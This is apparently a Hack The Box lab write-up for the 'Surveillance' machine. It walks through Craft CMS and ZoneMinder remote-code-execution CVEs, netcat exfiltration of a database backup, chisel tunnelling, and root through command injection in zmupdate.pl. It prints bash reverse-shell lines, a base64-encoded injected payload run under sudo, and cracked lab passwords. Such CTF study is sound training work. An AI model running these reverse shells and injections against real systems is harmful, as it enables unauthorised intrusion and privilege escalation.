---
categories:
- write-up
- Linux
- Medium
date: "2024-12-12T00:00:00Z"
title: Survellance - Hack The Box
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---

![survellance Logo](/assets/images/HTB/survellance/Surveillance-LOGO.png)


Survellance is a medium machine of Hack The Box (HTB), the machine  begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access to the system. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows me to access a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the 'zoneminder' user. The final step involves leveraging sudo privileges to achieve full root access.


{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}

- CMS
- Craft CMS
- Unauth-RCE
- CVE-2023-41892
- Port fowarding
- CVE-2023-26035

{{% /details %}}
{{< /callout >}}

## Enumeration 

### Port Scan

First, let's kick things off with an Nmap scan to enumerate open ports and services on the target:

```bash
nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
```

```
# Nmap 7.94SVN scan initiated Thu Mar 21 14:48:00 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
Nmap scan report for 10.10.11.245
Host is up, received reset ttl 63 (0.058s latency).
Scanned at 2024-03-21 14:48:01 EDT for 56s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 21 14:48:57 2024 -- 1 IP address (1 host up) scanned in 57.52 seconds
```

The scan reveals SSH on port 22 and a web server (nginx) on port 80. The HTTP service redirects to http://surveillance.htb/, so let's add this to our /etc/hosts:

```bash
echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```
Next, we use whatweb to gather more details about the web service:

```bash
whatweb surveillance.htb
```

![Alt text](/assets/images/HTB/survellance/surv1.png)

By checking the result of *whatweb* I can see from the begginning that we will be dealing with a Content Management System (CMS), being more specific in this case we'll be dealing with **Craft CMS**

## FootHold

![Alt text](/assets/images/HTB/survellance/surv2.png)

Visiting the website on port 80, we identify the CMS version and discover a known vulnerability, ([CVE-2023-41892](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_unauth_rce_cve_2023_41892/)), which affects Craft CMS versions between **4.0.0-RC1 and 4.4.14**. This vulnerability allows for *unauthenticated remote code execution (RCE)*.

* The vulnerability lies in how Craft CMS handles functionalities like *\GuzzleHttp\Psr7\FnStream* which allows for selective method invocation. An attacker can craft a specially crafted request that triggers this functionality and injects malicious code. This code could then be written to the system's log file.
* Since Craft CMS parses the log files for certain purposes, the *injected code can be executed unintentionally*. This grants the attacker remote code execution capabilities.

We find a working exploit on [GitHub](https://github.com/Faelian/CraftCMS_CVE-2023-41892).:

```bash
python3 craft-cms.py http://surveillance.htb/
```

Executing this exploit grants us shell access as `www-data`.

![Alt text](/assets/images/HTB/survellance/surv3.png)

In order to stabilize the shell, I execute:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
```

## Privilege Escalation to Matthew 

While enumerating the system we can see two users (other than root) Matthew & ZoneMinder. After looking around I found a backup directory containing a zip file which is contains SQL backup file:

* **Path:**  /var/www/html/craft/storage/backups
We transfer the file to our machine for inspection:

while enumerating the system  With our current user (www-data) I found a backup directory that contains a zip file which was interesting.

I send the file to my machine to inspect it.

* On receiving machine:


```bash
nc -nlvp 443  > surv.zip 
```

* On Sender Machine:

```bash
nc 10.10.14.13 443 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

After reading the file you can see that it is creating some DB (creating tables and inserting data) and almost at the end you can find the data being inserted to user table

![Alt text](/assets/images/HTB/survellance/surv4.png)

From the picture above I am able to see that matthew is admin (somewhere) and I can see a long string that could be an encrypted password. To crack the hash I did it with crackstation:
* 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec

![Alt text](/assets/images/HTB/survellance/surv5.png)

I am able to get a password match! --> **starcraft122490**

![Alt text](/assets/images/HTB/survellance/surv6.png)

## Escalating to ZoneMinder


With access to Matthew's account, I decided to do some more enumeration check for locally running services that might be exploitable:

```bash
netstat -tunlp
```

![Alt text](/assets/images/HTB/survellance/surv7.png)

I checked the page with curl but it turned out to be a lot of HTML code so i decided to make a port forwarding with *chisel*.

```bash
#on Attacking machine 
./chisel_lin server -p 443 --reverse

#on Victim machine
./chisel_lin client 10.10.14.226:443 R:4444:127.0.0.1:4545
./chisel_lin server -p 4545 --socks5

#on the attacking machine 
./chisel_lin client localhost:4444 1081:socks
```
![Alt text](/assets/images/HTB/survellance/surv8.png)


After establishing the connection on my socks tunnel I am able to connect to the page hosted on localhost:8080 and that is when I realise that ***ZoneMinder*** more than an user its a service/software.

![Alt text](/assets/images/HTB/survellance/surv9.png)

Then i look for zoneminder exploits on google and I encounter with **CVE-2023-26035**: "Unauthenticated Remote Code Execution in ZoneMinder"
I wasn't able to find any type of information related to the version, but since it seemed to be a easy exploit to run i decided to give it a try. Also taking into account the year of the *CVE* it looked that it could be a possible way of attacking

The vulnerability lies in the way ZoneMinder handles the "snapshot" function. This function is supposed to capture an image from a connected security camera. However, due to a missing authorization check, *an attacker can manipulate this function to create a new monitor instead of fetching an existing one*. By crafting a specially crafted request, the attacker can inject malicious code that gets executed by the ZoneMinder server.

I found a working Exploit on [GitHub](https://github.com/rvizx/CVE-2023-26035):

```bash
proxychains python3 exploit-zone.py -t http://127.0.0.1:8080/ -ip 10.10.14.13 -p 445
```
***NOTE:*** This exploit did worked for me but for some reason not all the times, I had to ran it like 2-3 times for it to give me shell.

![Alt text](/assets/images/HTB/survellance/surv10.png)

This grants us shell access as the `zoneminder` user.


## Escalating to Root
I check if I have any sudo privileges with "ZoneMinder" user

![Alt text](/assets/images/HTB/survellance/surv11.png)

Checking for sudo privileges, we find that the zoneminder user can run scripts matching the pattern ***zm\*.pl in /usr/bin***:

 i look online for *"escalate priviles zoneminder zm.pl"* and i found an interesting [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw) page talking about something related.

The Security advisory basically says that this is affecting version < 1.36.33. I check our working version, since I did not know if it was affected by the issue mentioned before

```bash
dpkg -s zoneminder | grep Version
```

This command is used to check the version of a specific package installed on your system, in this specific case "zoneminder".
![Alt text](/assets/images/HTB/survellance/surv12.png)

I check for config files of zoneminder and in found /etc/zm and it seems i can see its password in  **clear text!**

![Alt text](/assets/images/HTB/survellance/surv13.png)

* ZoneMinderPassword2023

After reading for a while I was identify **zmupdate.pl** as a vulnerable script and craft a payload to exploit it. The script takes user input directly into a bash connection query, making it susceptible to command injection.


![Alt text](/assets/images/HTB/survellance/surv14.png)


To exploit this, we create a payload that provides a reverse shell. First, we encode the payload in base64 to safely pass it as a command:

```bash
echo  "bash -c 'bash -i >& /dev/tcp/10.10.14.35/443 0>&1' " | base64 -w0 
```
NOW I send the payload:

```bash
sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEnIAo=" |base64 -d |bash;'
```
Since user input is going dirrectly into a bash connection query we can send some code in bash that will alter the behaviour and will alow us to get root

![Alt text](/assets/images/HTB/survellance/surv15.png)